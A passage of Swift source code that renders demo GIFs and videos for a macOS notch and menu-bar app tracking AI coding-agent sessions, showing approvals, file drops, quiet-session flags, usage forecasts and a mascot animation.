        func row(_ s: Session, _ style: IslandRowView.Style) -> NSView {
            let r = IslandRowView(session: s, mark: mark(s), style: style, onClick: { _ in })
            r.translatesAutoresizingMaskIntoConstraints = false
            r.widthAnchor.constraint(equalToConstant: rowW).isActive = true
            return r
        }
        let card = IslandApprovalView(request: request, deferTitle: "Answer in terminal",
                                      width: rowW - 12, onChoose: { _ in })
        let wrap = NSStackView(views: [card])
        wrap.orientation = .horizontal
        wrap.edgeInsets = NSEdgeInsets(top: 0, left: 12, bottom: 0, right: 0)
        let content = Stage.openPanel([row(claude, .hero), wrap, row(codex, .compact), row(aider, .compact),
                                       row(copilot, .compact)])
        let panelImg = Stage.snapshot(content)
        let allow = Stage.button("Allow", in: content)!

        // Scene 1b: later, the island hidden while you were away — the peek, and
        // Clawd poked in the open panel. The same three sessions, Claude now pushing.
        let pushing = session("tour-claude-push", ["agent": "claude", "state": "tool",
            "label": "Bash: git push origin main", "project": "webshop", "started_at": now - 1700,
            "prompt": "ship the checkout fix", "model": "claude-opus-5", "term_program": "iTerm.app"])
        let hero = IslandRowView(session: pushing, mark: mark(pushing), style: .hero, onClick: { _ in })
        hero.translatesAutoresizingMaskIntoConstraints = false
        hero.widthAnchor.constraint(equalToConstant: rowW).isActive = true
        let busy = Stage.openPanel([hero, row(codex, .compact), row(aider, .compact), row(copilot, .compact)])
        let busyImg = Stage.snapshot(busy)
        let mascot = hero.mascot
        let markAt = Stage.rect(of: mascot, in: busy)
        // The panel once more with the mark's pixels blank, for the reacting mark to
        // be drawn over: an empty image of the same size leaves the layout alone.
        let restMark = mascot.image
        mascot.image = restMark.map { NSImage(size: $0.size) }
        let blankImg = Stage.snapshot(busy)
        mascot.image = restMark
        let pokes = Poke.record(mascot, session: pushing.id)

        let topY = H - Stage.barH
        let panelRect = NSRect(x: (W - panelImg.size.width) / 2, y: topY - panelImg.size.height,
                               width: panelImg.size.width, height: panelImg.size.height)
        let allowPt = NSPoint(x: panelRect.minX + allow.midX * 2, y: panelRect.minY + allow.midY * 2 + 10)
        let pillW: CGFloat = 290, pillH: CGFloat = 60
        let pillRect = NSRect(x: (W - pillW) / 2, y: topY - pillH, width: pillW, height: pillH)
        let shadow = NSShadow(); shadow.shadowBlurRadius = 22
        shadow.shadowOffset = NSSize(width: 0, height: -8)
        shadow.shadowColor = NSColor.black.withAlphaComponent(0.35)

        func pill(_ label: String, color: NSColor, mark: NSImage?, count: Int, alpha: CGFloat = 1,
                  drop: CGFloat = 0) {
            // A peek is the hide played backwards: fading in while it drops the last
            // few points out of the notch (`IslandController.hideSlide`, 6 pt).
            let cg = NSGraphicsContext.current!.cgContext
            cg.saveGState()
            cg.setAlpha(alpha)
            cg.translateBy(x: 0, y: drop)
            cg.beginTransparencyLayer(auxiliaryInfo: nil)
            defer { cg.endTransparencyLayer(); cg.restoreGState() }
            NSGraphicsContext.saveGraphicsState(); shadow.set()
            Stage.fill(Stage.island(pillRect, ear: 0), .black)
            NSGraphicsContext.restoreGraphicsState()
            let t = Stage.text(label, 23, color, weight: .medium, mono: true)
            let badge = Stage.text("\(count)", 19, Stage.rgb(0xFFFFFF, 0.65), weight: .semibold, mono: true)
            let mh: CGFloat = 34, mw = mark.map { mh * $0.size.width / max(1, $0.size.height) } ?? 0
            let bw = count > 0 ? badge.size().width + 18 : 0
            let tw = label.isEmpty ? 0 : t.size().width
            let total = (mark == nil ? 0 : mw + (tw > 0 ? 12 : 0)) + tw + (count > 0 ? 12 + bw : 0)
            var x = pillRect.midX - total / 2
            if let mark { mark.draw(in: NSRect(x: x, y: pillRect.midY - mh / 2, width: mw, height: mh)); x += mw + 12 }
            if tw > 0 { t.draw(at: NSPoint(x: x, y: pillRect.midY - t.size().height / 2)); x += tw + 12 }
            if count > 0 {
                Stage.rgb(0xFFFFFF, 0.12).setFill()
                Stage.rounded(NSRect(x: x, y: pillRect.midY - 15, width: bw, height: 30), 8).fill()
                badge.draw(at: NSPoint(x: x + 9, y: pillRect.midY - badge.size().height / 2))
            }
        }
        func caption(_ s: String) {
            let t = Stage.text(s, 30, .white, weight: .semibold)
            let r = NSRect(x: (W - t.size().width) / 2 - 20, y: 34, width: t.size().width + 40, height: 58)
            Stage.rgb(0x000000, 0.38).setFill(); Stage.rounded(r, 16).fill()
            t.draw(at: NSPoint(x: r.minX + 20, y: r.midY - t.size().height / 2))
        }
        /// A window image (2x rep) on the desktop, scaled to fit, with a shadow.
        func window(_ rep: NSBitmapImageRep, top: CGFloat = 70) -> (NSRect, CGFloat) {
            let px = NSSize(width: rep.pixelsWide, height: rep.pixelsHigh)
            let scale = min(1, 1080 / px.width, (H - 250) / px.height)
            let size = NSSize(width: px.width * scale, height: px.height * scale)
            let r = NSRect(x: (W - size.width) / 2, y: H - top - size.height, width: size.width, height: size.height)
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 36; sh.shadowOffset = NSSize(width: 0, height: -12)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.32); sh.set()
            NSColor.windowBackgroundColor.setFill(); Stage.rounded(r, 22).fill()
            NSGraphicsContext.restoreGraphicsState()
            NSGraphicsContext.saveGraphicsState()
            Stage.rounded(r, 22).addClip()
            rep.draw(in: r)
            NSGraphicsContext.restoreGraphicsState()
            return (r, scale * 2)          // points in the window → pixels on the canvas
        }
        func point(_ f: NSRect, in r: NSRect, _ k: CGFloat) -> NSPoint {
            NSPoint(x: r.minX + f.midX * k, y: r.minY + f.midY * k)
        }

        // Scene 2's windows, one per mode.
        let modes: [Presentation] = [.island, .menuBar, .both]
        let frame0 = sprite.colorFrames.first ?? sprite.restingColor
        var welcome: [Presentation: (NSBitmapImageRep, [NSRect])] = [:]
        for m in modes {
            if let r = WelcomeWindow.shared.renderForVerification(mode: m, mark: frame0, word: "Thinking",
                                                                wired: ["claude", "codex", "copilot"]) {
                welcome[m] = (r.image, r.radioFrames)
            }
        }
        // Scene 3's pages.
        let pages: [SettingsWindow.Page] = [.notifications, .general, .shortcuts]
        var settings: [SettingsWindow.Page: NSBitmapImageRep] = [:]
        var sidebar: [SettingsWindow.Page: NSRect] = [:]
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        for p in pages {
            let file = dir.appendingPathComponent("settings-\(p.rawValue).png")
            _ = SettingsWindow.shared.renderPageForVerification(p, to: file)
            if let d = try? Data(contentsOf: file), let rep = NSBitmapImageRep(data: d) { settings[p] = rep }
            sidebar[p] = SettingsWindow.shared.sidebarFrame(of: p)
        }

        /// Opening from the pill (0) to the panel (1), the outline recut every step.
        func openIsland(_ img: NSImage, _ t: CGFloat) {
            let panelRect = NSRect(x: (W - img.size.width) / 2, y: topY - img.size.height,
                                   width: img.size.width, height: img.size.height)
            let (r, ear) = Stage.growing(pill: pillRect, panel: panelRect, t: t, topY: topY)
            let outline = Stage.island(r, ear: ear)
            NSGraphicsContext.saveGraphicsState(); shadow.set()
            Stage.fill(outline, .black)
            NSGraphicsContext.restoreGraphicsState()
            if t > 0.5 {
                NSGraphicsContext.saveGraphicsState(); Stage.clip(outline)
                img.draw(in: panelRect, from: .zero, operation: .sourceOver, fraction: (t - 0.5) / 0.5)
                NSGraphicsContext.restoreGraphicsState()
            }
        }

        let peekLength = 76
        let start = NSPoint(x: W - 180, y: 300), notchPt = NSPoint(x: W / 2 + 30, y: topY - 20)
        func scene(_ frame: Int) -> CGImage {
            // Everything after the peek scene runs on the clock it had before it.
            let f = frame >= 96 + peekLength ? frame - peekLength : frame
            return Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                let mk = sprite.colorFrames.isEmpty ? sprite.restingColor
                                                    : sprite.colorFrames[frame % sprite.colorFrames.count]
                var cur: NSPoint?
                var pressed = false
                if frame >= 96, frame < 96 + peekLength {
                    let p = frame - 96
                    Stage.menuBar(W, H, app: "iTerm2", notch: true)
                    caption(p < 30 ? "Hidden while you're away · reach for the notch and it's back"
                                   : "Poke the mascot (opt-in) · three quick clicks and it's dizzy")
                    let busyRect = NSRect(x: (W - busyImg.size.width) / 2, y: topY - busyImg.size.height,
                                          width: busyImg.size.width, height: busyImg.size.height)
                    let markPt = NSPoint(x: busyRect.minX + markAt.midX * 2,
                                         y: busyRect.minY + markAt.midY * 2)
                    let pokeAt = [42, 47, 52]
                    // The hover zone is the menu-bar strip over the notch, not the pill.
                    let zonePt = NSPoint(x: W / 2 + 30, y: topY + 30)
                    switch p {
                    case 0..<12:                    // nothing under the notch; the pointer arrives
                        cur = Stage.lerp(start, zonePt, Stage.smooth(CGFloat(p) / 11))
                    case 12..<22:                   // the pill peeks back, then stays
                        let t = Stage.smooth(CGFloat(p - 12) / 3)
                        pill("Pushing…", color: .white, mark: mk, count: 3, alpha: t, drop: 12 * (1 - t))
                        cur = zonePt
                    case 22..<30: openIsland(busyImg, Stage.smooth(CGFloat(p - 22) / 8)); cur = zonePt
                    default:
                        // The last poke that has landed, and how far into its reaction.
                        if let i = pokeAt.lastIndex(where: { p >= $0 }),
                           let img = pokes[i].frame(at: Double(p - pokeAt[i]) * 0.085) {
                            openIsland(blankImg, 1)
                            img.draw(in: NSRect(x: markPt.x - img.size.width / 2,
                                                y: busyRect.minY + markAt.minY * 2 - Poke.pad * 2,
                                                width: img.size.width, height: img.size.height))
                        } else {
                            openIsland(busyImg, 1)
                        }
                        let aim = NSPoint(x: markPt.x + 14, y: markPt.y - 10)
                        cur = Stage.lerp(zonePt, aim, Stage.smooth(CGFloat(p - 30) / 10))
                        pressed = pokeAt.contains { p >= $0 - 2 && p < $0 }
                    }
                } else if f < 96 {
                    Stage.menuBar(W, H, app: "iTerm2", notch: true)
                    caption("Allow or deny from the notch · every agent you run, in one list")
                    func open(_ t: CGFloat) { openIsland(panelImg, t) }
                    switch f {
                    case 0..<20:
                        pill("approve?", color: .white, mark: mk, count: 3)
                        cur = Stage.lerp(start, notchPt, Stage.smooth(CGFloat(f - 4) / 14))
                    case 20..<28: open(Stage.smooth(CGFloat(f - 20) / 8)); cur = notchPt
                    case 28..<52:
                        open(1)
                        cur = Stage.lerp(notchPt, allowPt, Stage.smooth(CGFloat(f - 30) / 14))
                        pressed = f >= 48
                    case 52..<58: open(Stage.smooth(1 - CGFloat(f - 52) / 6)); cur = allowPt
                    case 58..<76:
                        pill("✓ Allowed", color: Stage.rgb(0x59D973), mark: nil, count: 0)
                        cur = Stage.lerp(allowPt, start, Stage.smooth(CGFloat(f - 58) / 16))
                    default: pill("Pushing…", color: .white, mark: mk, count: 3)
                    }
                } else if f < 176 {
                    Stage.menuBar(W, H, app: "AgentBar", notch: true)
                    caption("Menu bar, Dynamic Island, or both")
                    let order: [(Int, Presentation)] = [(96, .island), (118, .menuBar), (146, .both)]
                    let mode = order.last(where: { f >= $0.0 })!.1
                    if let (rep, radios) = welcome[mode] {
                        let (r, k) = window(rep)
                        let target: Presentation = f < 118 ? .menuBar : .both
                        let idx = Presentation.allCases.firstIndex(of: target)!
                        let aim = radios.indices.contains(idx) ? point(radios[idx], in: r, k) : NSPoint(x: W / 2, y: H / 2)
                        let from = f < 118 ? NSPoint(x: W - 200, y: 260) : point(radios[Presentation.allCases.firstIndex(of: .menuBar)!], in: r, k)
                        let t0 = f < 118 ? 100 : 124
                        cur = f >= 146 ? aim : Stage.lerp(from, aim, Stage.smooth(CGFloat(f - t0) / 14))
                        pressed = (f >= 116 && f < 119) || (f >= 144 && f < 147)
                        cur = cur.map { NSPoint(x: $0.x - 20, y: $0.y + 10) }
                    }
                } else {
                    Stage.menuBar(W, H, app: "AgentBar", notch: true)
                    caption("Notifications, sounds, global shortcuts: all in Settings")
                    let order: [(Int, SettingsWindow.Page)] = [(176, .notifications), (204, .general),
                                                                (234, .shortcuts)]
                    let page = order.last(where: { f >= $0.0 })!.1
                    if let rep = settings[page] {
                        let (r, k) = window(rep, top: 90)
                        if let next = order.first(where: { $0.0 > f }), let side = sidebar[next.1] {
                            let aim = NSPoint(x: r.minX + side.minX * k + 70, y: r.minY + side.midY * k)
                            let prev = sidebar[page].map { NSPoint(x: r.minX + $0.minX * k + 70, y: r.minY + $0.midY * k) }
                                ?? NSPoint(x: W - 200, y: 260)
                            let t = Stage.smooth(CGFloat(f - (next.0 - 16)) / 12)
                            cur = f < next.0 - 16 ? prev : Stage.lerp(prev, aim, t)
                            pressed = f >= next.0 - 3
                        } else if let side = sidebar[page] {
                            cur = NSPoint(x: r.minX + side.minX * k + 70, y: r.minY + side.midY * k)
                        }
                    }
                }
                if let cur { Stage.cursor(at: cur, pressed: pressed) }
            }
        }

        // Scene 0: the launch hello. The pill comes up idle and Clawd waves from it,
        // the real `MascotEyes.waveFrames` (six frames of `Greeting.frameLength`)
        // on the resting mark the pill shows — opt-in personality, once a launch.
        let rest = sprite.restingColor
        guard let wave = MascotEyes.waveFrames(of: rest) else { fatalError("no claw to wave") }
        let delay = 0.085
        let perWave = max(1, Int((MascotPersonality.Greeting.frameLength / delay).rounded()))
        let helloLead = 3, helloTail = 4
        var hello: [CGImage] = []
        for i in 0..<(helloLead + wave.count * perWave + helloTail) {
            let w = i - helloLead
            let img = w >= 0 && w / perWave < wave.count ? wave[w / perWave] : rest
            hello.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                Stage.menuBar(W, H, app: "Finder", notch: true)
                caption("Opt-in personality · Clawd says hello")
                // It drops out of the notch first: the launch's pill appearing.
                let t = Stage.smooth(CGFloat(i + 1) / CGFloat(helloLead + 1))
                pill("", color: .white, mark: img, count: 0, alpha: t, drop: 12 * (1 - t))
            })
        }

        var frames: [CGImage] = hello
        let total = 270 + peekLength   // Shortcuts, the last page, holds ~3 s
        for f in 0..<total { frames.append(scene(f)) }
        // Soften the two cuts between scenes: four frames of cross-fade each.
        func blend(_ a: CGImage, _ b: CGImage, _ t: CGFloat) -> CGImage {
            Stage.frame(W, H) {
                NSImage(cgImage: a, size: NSSize(width: W, height: H)).draw(in: NSRect(x: 0, y: 0, width: W, height: H))
                NSImage(cgImage: b, size: NSSize(width: W, height: H))
                    .draw(in: NSRect(x: 0, y: 0, width: W, height: H), from: .zero, operation: .sourceOver, fraction: t)
            }
        }
        // No fade out of the hello: the same pill, in the same place, starts asking —
        // and a full-frame fade costs the GIF more than the whole beat.
        let o = hello.count
        for cut in [o + 96, o + 96 + peekLength, o + 176 + peekLength] {
            let a = frames[cut - 1], b = frames[cut]
            for i in 0..<4 { frames[cut - 4 + i] = blend(a, b, CGFloat(i + 1) / 5) }
        }
        Stage.writeGIF(frames, delay: delay, to: base.appendingPathExtension("gif"))
        Stage.writeMP4(frames, delay: delay, to: base.appendingPathExtension("mp4"))
        // The poster: the island open on the approval, the pointer on its way to Allow
        // and not yet covering it.
        Stage.writeJPEG(frames[o + 36], to: base.appendingPathExtension("jpg"))
    }
}

// MARK: - GIF 4: hand a file to an agent, quiet sessions, will it last

enum HandAFile {
    static let W: CGFloat = 1200, H: CGFloat = 1000

    /// A drag in progress, for `draggingEntered` to be called the way AppKit calls
    /// it. The row asks the session, not the drag, whether it can take a file, so
    /// nothing here is read; it only has to exist.
    final class Drag: NSObject, NSDraggingInfo {
        let draggingPasteboard = NSPasteboard(name: NSPasteboard.Name("agentbar-gifs-drag"))
        var draggingDestinationWindow: NSWindow? { nil }
        var draggingSourceOperationMask: NSDragOperation { .copy }
        var draggingLocation: NSPoint { .zero }
        var draggedImageLocation: NSPoint { .zero }
        var draggedImage: NSImage? { nil }
        var draggingSource: Any? { nil }
        var draggingSequenceNumber: Int { 1 }
        func slideDraggedImage(to screenPoint: NSPoint) {}
        var draggingFormation: NSDraggingFormation = .default
        var animatesToDestination = false
        var numberOfValidItemsForDrop = 1
        func enumerateDraggingItems(options enumOpts: NSDraggingItemEnumerationOptions = [], for view: NSView?,
                                    classes classArray: [AnyClass],
                                    searchOptions: [NSPasteboard.ReadingOptionKey: Any] = [:],
                                    using block: (NSDraggingItem, Int, UnsafeMutablePointer<ObjCBool>) -> Void) {}
        var springLoadingHighlight: NSSpringLoadingHighlight { .none }
        func resetSpringLoading() {}
    }

    static func write(to url: URL) {
        NSApp.appearance = NSAppearance(named: .aqua)
        let now = Date()
        let t = Int(now.timeIntervalSince1970)
        // The clock and the forecast agree: the forecast is read against the real
        // time, so the menu bar shows it too, and the screenshot was taken a minute ago.
        let clockFmt = DateFormatter(); clockFmt.timeStyle = .short; clockFmt.dateStyle = .none
        let dayFmt = DateFormatter(); dayFmt.locale = Locale(identifier: "en_US"); dayFmt.dateFormat = "EEE d MMM"
        let clock = dayFmt.string(from: now) + "   " + clockFmt.string(from: now)
        let shotFmt = DateFormatter(); shotFmt.dateFormat = "HH.mm"
        let shotName = "Screenshot \(shotFmt.string(from: now.addingTimeInterval(-60))).png"
        let shotPath = "/Users/you/Desktop/" + shotName
        guard let typed = DropToAgent.text(for: [shotPath]) else { fatalError("the path would not paste") }

        func session(_ id: String, _ o: [String: Any]) -> Session {
            var o = o
            o["sessionId"] = id; o["pid"] = 1; o["started"] = true
            if o["ts"] == nil { o["ts"] = t }
            o["cwd"] = "/tmp/agentbar-demo-\(id)"
            return Session(fileURL: Stage.tmp(id, o))!
        }
        let claude = session("hand-claude", ["agent": "claude", "state": "done", "label": "",
            "project": "webshop", "started_at": t - 1500, "prompt": "make the checkout button match the mockup",
            "recap": "Restyled the checkout button", "model": "claude-opus-5", "term_program": "iTerm.app"])
        // Working, and no hook has written for twelve and a half minutes: QuietWatch's flag.
        let codex = session("hand-codex", ["agent": "codex", "state": "tool", "label": "Running tests",
            "project": "api", "started_at": t - 2400, "ts": t - 750, "prompt": "fix the flaky orders test"])
        let gemini = session("hand-gemini", ["agent": "gemini", "state": "thinking", "label": "Thinking",
            "project": "docs", "started_at": t - 300, "prompt": "document the refunds endpoint"])
        guard QuietWatch.quietMinutes(codex) != nil, QuietWatch.quietMinutes(claude) == nil else {
            fatalError("the quiet chip would not show — quietWatchMinutes set in this process's defaults?")
        }

        // The quota line, the way UsageCenter hands it over, and the last forty
        // minutes of Claude's 5-hour window fed to the real pace fit: 64 % → 88 %,
        // so at this pace it is gone in under half an hour, before its reset — the
        // one case the island colours amber.
        let reset = now.addingTimeInterval(2 * 3600 + 10 * 60)
        func claudeReading(_ used: Double) -> UsageCenter.Reading {
            UsageCenter.Reading(provider: "Claude", text: "\(Int(100 - used))% left · resets later",
                                windows: [UsageWindow(name: "5h", usedPercent: used, resetsAt: reset)])
        }
        for i in 0...8 {
            let ago = Double(8 - i) * 5 * 60
            UsagePace.shared.record([claudeReading(64 + Double(i) * 3)], now: now.timeIntervalSince1970 - ago)
        }
        let codexReading = UsageCenter.Reading(provider: "Codex", text: "59% left",
            windows: [UsageWindow(name: "5h", usedPercent: 41, resetsAt: now.addingTimeInterval(3 * 3600))])
        let readings = [claudeReading(88), codexReading]
        guard let f = UsagePace.shared.forecast(provider: "Claude", window: readings[0].windows[0]),
              UsagePace.urgent(f) else { fatalError("the forecast would not show") }

        /// The footer `IslandController.footerRow` builds: the meter line, a spacer,
        /// the break button and ⋯ — the meter is the real view, the two buttons are
        /// the same symbols it uses.
        func footer() -> NSView {
            let meters = UsageMeterView(readings: readings, style: .islandFooter)!
            meters.translatesAutoresizingMaskIntoConstraints = false
            meters.heightAnchor.constraint(equalToConstant: meters.frame.height).isActive = true
            meters.setContentHuggingPriority(.defaultHigh, for: .horizontal)
            let spacer = NSView()
            spacer.setContentHuggingPriority(.defaultLow, for: .horizontal)
            let game = NSButton(image: NSImage(systemSymbolName: "gamecontroller", accessibilityDescription: nil)!,
                                target: nil, action: nil)
            game.isBordered = false
            game.symbolConfiguration = .init(pointSize: 12, weight: .semibold)
            game.contentTintColor = NSColor.white.withAlphaComponent(0.55)
            let dots = NSButton(title: "⋯", target: nil, action: nil)
            dots.isBordered = false
            dots.font = .systemFont(ofSize: 15, weight: .semibold)
            dots.contentTintColor = NSColor.white.withAlphaComponent(0.55)
            let row = NSStackView(views: [meters, spacer, game, dots])
            row.orientation = .horizontal
            row.translatesAutoresizingMaskIntoConstraints = false
            row.widthAnchor.constraint(equalToConstant: 460 - IslandContentView.hPad * 2).isActive = true
            return row
        }

        let rowW: CGFloat = 460 - IslandContentView.hPad * 2
        func row(_ s: Session, _ style: IslandRowView.Style) -> IslandRowView {
            let r = IslandRowView(session: s, mark: IconRenderer.shared.sprite(for: s.agent).restingColor,
                                  style: style, onClick: { _ in })
            r.translatesAutoresizingMaskIntoConstraints = false
            r.widthAnchor.constraint(equalToConstant: rowW).isActive = true
            return r
        }
        let hero = row(claude, .hero)
        let codexRow = row(codex, .compact)
        let content = Stage.openPanel([hero, codexRow, row(gemini, .compact)], footer: footer())
        let restImg = Stage.snapshot(content)
        let heroAt = Stage.rect(of: hero, in: content)
        let codexAt = Stage.rect(of: codexRow, in: content)
        // The real hover face and the real outcome, through the row's own entry points.
        _ = hero.draggingEntered(Drag())
        let hoverImg = Stage.snapshot(content)
        hero.draggingExited(nil)
        hero.report(.pasted)
        let pastedImg = Stage.snapshot(content)

        let topY = H - Stage.barH
        let panelRect = NSRect(x: (W - restImg.size.width) / 2, y: topY - restImg.size.height,
                               width: restImg.size.width, height: restImg.size.height)
        func onCanvas(_ r: NSRect) -> NSRect {
            NSRect(x: panelRect.minX + r.minX * 2, y: panelRect.minY + r.minY * 2,
                   width: r.width * 2, height: r.height * 2)
        }
        let heroRect = onCanvas(heroAt), codexRect = onCanvas(codexAt)
        let shadow = NSShadow(); shadow.shadowBlurRadius = 22
        shadow.shadowOffset = NSSize(width: 0, height: -8)
        shadow.shadowColor = NSColor.black.withAlphaComponent(0.35)

        func island(_ img: NSImage) {
            let outline = Stage.island(panelRect, ear: IslandShape.earWidth)
            NSGraphicsContext.saveGraphicsState(); shadow.set()
            Stage.fill(outline, .black)
            NSGraphicsContext.restoreGraphicsState()
            NSGraphicsContext.saveGraphicsState(); Stage.clip(outline)
            img.draw(in: panelRect)
            NSGraphicsContext.restoreGraphicsState()
        }

        // The screenshot on the desktop: a thumbnail of a checkout mockup and its name.
        let iconSize = NSSize(width: 150, height: 104)
        func thumbnail(at c: NSPoint, alpha: CGFloat, label: Bool) {
            let r = NSRect(x: c.x - iconSize.width / 2, y: c.y - iconSize.height / 2,
                           width: iconSize.width, height: iconSize.height)
            let cg = NSGraphicsContext.current!.cgContext
            cg.saveGState(); cg.setAlpha(alpha); cg.beginTransparencyLayer(auxiliaryInfo: nil)
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 10; sh.shadowOffset = NSSize(width: 0, height: -3)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.3); sh.set()
            NSColor.white.setFill(); Stage.rounded(r, 6).fill()
            NSGraphicsContext.restoreGraphicsState()
            let inner = r.insetBy(dx: 5, dy: 5)
            Stage.rgb(0xF5F5F7).setFill(); Stage.rounded(inner, 3).fill()
            Stage.rgb(0xDADDE3).setFill(); NSRect(x: inner.minX, y: inner.maxY - 14, width: inner.width, height: 14).fill()
            for (i, w) in [0.62, 0.48, 0.55].enumerated() {
                Stage.rgb(0xC4C8D0).setFill()
                Stage.rounded(NSRect(x: inner.minX + 10, y: inner.maxY - 30 - CGFloat(i) * 13,
                                     width: inner.width * CGFloat(w), height: 6), 3).fill()
            }
            Stage.rgb(0x5B6CFF).setFill()
            Stage.rounded(NSRect(x: inner.midX - 32, y: inner.minY + 9, width: 64, height: 16), 5).fill()
            cg.endTransparencyLayer(); cg.restoreGState()
            guard label else { return }
            let name = Stage.text(shotName, 19, .white, weight: .medium)
            let lr = NSRect(x: c.x - name.size().width / 2 - 8, y: r.minY - 36, width: name.size().width + 16, height: 28)
            Stage.rgb(0x000000, 0.28).setFill(); Stage.rounded(lr, 7).fill()
            name.draw(at: NSPoint(x: lr.minX + 8, y: lr.midY - name.size().height / 2))
        }

        // The terminal Claude runs in: its last turn, and the prompt the path lands in.
        let term = NSRect(x: 40, y: 120, width: 760, height: 300)
        func terminal(pasted: Bool, blink: Bool) {
            NSGraphicsContext.saveGraphicsState()
            let sh = NSShadow(); sh.shadowBlurRadius = 24; sh.shadowOffset = NSSize(width: 0, height: -8)
            sh.shadowColor = NSColor.black.withAlphaComponent(0.35); sh.set()
            Stage.rgb(0x1E1E22, 0.97).setFill()
            Stage.rounded(term, 18).fill()
            NSGraphicsContext.restoreGraphicsState()
            for (i, c) in [0xFF5F57, 0xFEBC2E, 0x28C840].enumerated() {
                Stage.rgb(UInt32(c)).setFill()
                NSBezierPath(ovalIn: NSRect(x: term.minX + 22 + CGFloat(i) * 26, y: term.maxY - 32,
                                            width: 16, height: 16)).fill()
            }
            let title = Stage.text("webshop — claude", 19, Stage.rgb(0xB0B0B0), weight: .medium)
            title.draw(at: NSPoint(x: term.midX - title.size().width / 2, y: term.maxY - 36))
            var y = term.maxY - 82
            for (s, c) in [("> make the checkout button match the mockup", Stage.rgb(0x9A9A9A)),
                           ("⏺ Restyled the checkout button.", Stage.rgb(0xE8E8E8)),
                           ("  ⎿  src/checkout/Button.tsx  +12 −4", Stage.rgb(0x9A9A9A))] {
                Stage.text(s, 20, c, mono: true).draw(at: NSPoint(x: term.minX + 26, y: y))
                y -= 32
            }
            // The input box, as Claude Code draws it.
            let box = NSRect(x: term.minX + 20, y: term.minY + 26, width: term.width - 40, height: 56)
            Stage.rgb(0x6B6B70).setStroke()
            let p = Stage.rounded(box, 10); p.lineWidth = 1.5; p.stroke()
            let line = Stage.text("> " + (pasted ? typed : ""), 20, Stage.rgb(0xF2F2F2), mono: true)
            line.draw(at: NSPoint(x: box.minX + 16, y: box.midY - line.size().height / 2))
            if blink {
                Stage.rgb(0xE8E8E8).setFill()
                NSRect(x: box.minX + 16 + line.size().width, y: box.midY - 12, width: 11, height: 24).fill()
            }
        }

        func caption(_ s: String) {
            let tx = Stage.text(s, 29, .white, weight: .semibold)
            let r = NSRect(x: (W - tx.size().width) / 2 - 20, y: 34, width: tx.size().width + 40, height: 58)
            Stage.rgb(0x000000, 0.38).setFill(); Stage.rounded(r, 16).fill()
            tx.draw(at: NSPoint(x: r.minX + 20, y: r.midY - tx.size().height / 2))
        }

        let iconHome = NSPoint(x: 1000, y: 290)
        let grab = NSPoint(x: iconHome.x + 10, y: iconHome.y - 6)   // where the hand holds it
        // Low on the row's right, clear of the hint's centred words.
        let dropPt = NSPoint(x: heroRect.maxX - 90, y: heroRect.minY + 34)
        // Where the quiet chip and the forecast sit, for the pointer to rest by.
        // The pointer's tip sits just under each, so it never covers the words.
        let quietPt = NSPoint(x: codexRect.maxX - 130, y: codexRect.minY + 2)
        let footerPt = NSPoint(x: panelRect.minX + 330, y: panelRect.minY + 12)

        var frames: [CGImage] = []
        for f in 0..<168 {
            frames.append(Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                let pasted = f >= 70
                terminal(pasted: pasted, blink: (f / 6) % 2 == 0)
                Stage.menuBar(W, H, app: "iTerm2", notch: true, clock: clock)
                caption(f < 112 ? "Drop a file on a session · its path lands in the prompt, no Return"
                                : "Gone quiet? It asks, not guesses · and says when the limit runs out")
                var cur: NSPoint
                var pressed = false
                var carried: NSPoint? = nil
                switch f {
                case 0..<14:                          // the island open, the file on the desktop
                    island(restImg)
                    cur = Stage.lerp(NSPoint(x: 760, y: 560), grab, Stage.smooth(CGFloat(f) / 12))
                case 14..<46:                         // picked up, carried to Claude's row
                    let u = Stage.smooth(CGFloat(f - 16) / 26)
                    cur = Stage.lerp(grab, dropPt, u)
                    pressed = true
                    carried = cur
                    island(f >= 42 ? hoverImg : restImg)
                case 46..<68:                         // over the row: who it goes to
                    island(hoverImg)
                    cur = dropPt; pressed = true; carried = cur
                case 68..<112:                        // dropped: in the prompt, Return is yours
                    island(pastedImg)
                    cur = dropPt
                case 112..<140:                       // the quiet session
                    island(restImg)
                    cur = Stage.lerp(dropPt, quietPt, Stage.smooth(CGFloat(f - 112) / 12))
                default:                              // and the pace
                    island(restImg)
                    cur = Stage.lerp(quietPt, footerPt, Stage.smooth(CGFloat(f - 140) / 10))
                }
                thumbnail(at: iconHome, alpha: carried == nil ? 1 : 0.35, label: true)
                if let c = carried {
                    thumbnail(at: NSPoint(x: c.x - (grab.x - iconHome.x), y: c.y - (grab.y - iconHome.y)),
                              alpha: 0.8, label: false)
                }
                Stage.cursor(at: cur, pressed: pressed)
            })
        }
        Stage.writeGIF(frames, delay: 0.085, to: url)
    }
}

// MARK: - The poked mascot

/// Clawd's reactions in the open panel, played by the app's own code and read back
/// a frame at a time. `cacheDisplay` never sees Core Animation, so the snapshot
/// draws the mark at rest; this pokes the real `IslandMascotView` through
/// `IslandMascot` — the decision, squish or dizzy, is `MascotPersonality.Pokes`'s —
/// then takes the animations the view added off its layers and evaluates them at
/// the frame's time, setting each value on the model layer and rendering the tree.
struct Poke {
    /// Room around the view for a squish wider than the mark and stars over its head.
    static let pad: CGFloat = 14

    private let view: IslandMascotView
    private let tracks: [(layer: CALayer, animation: CAAnimation)]
    private let length: TimeInterval

    /// Three pokes in a row, the way a hand would land them: squish, squish, dizzy.
    /// The personality is off by default and this process's defaults are its own
    /// domain (Scripts/demo/README.md), so it is switched on here for the picture
    /// and the value cleared again before anything else is drawn.
    static func record(_ view: IslandMascotView, session id: String) -> [Poke] {
        MascotPersonality.Prefs.enabled = true
        defer { UserDefaults.standard.removeObject(forKey: MascotPersonality.Prefs.key) }
        let personality = IslandMascot()
        personality.attach(view, session: id)
        guard view.onPoke != nil else { fatalError("the mascot will not take a poke — Reduce Motion is on?") }
        let click = NSEvent.mouseEvent(with: .leftMouseUp, location: .zero, modifierFlags: [], timestamp: 0,
                                       windowNumber: 0, context: nil, eventNumber: 0, clickCount: 1,
                                       pressure: 0)!
        var out: [Poke] = []
        for _ in 0..<3 {
